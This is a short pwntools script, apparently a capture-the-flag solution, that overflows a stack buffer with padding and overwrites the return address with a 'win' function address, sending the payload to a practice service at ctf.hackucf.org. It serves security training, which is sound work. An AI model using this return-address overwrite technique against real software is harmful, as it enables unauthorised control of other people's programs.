from pwn import *

win = 0x0804861b
padding = 64
payload = 'A' * padding
payload += p32(0xdeadbeef) # ebp-0xc
payload += 'AAAAAAAAAAAA' # ebp-0x8 + ebp+0x4
payload += p32(win)

#p = process('./ret')
p = remote('ctf.hackucf.org', 9003)

# pause()
p.sendline(payload)


p.interactive()
p.close()
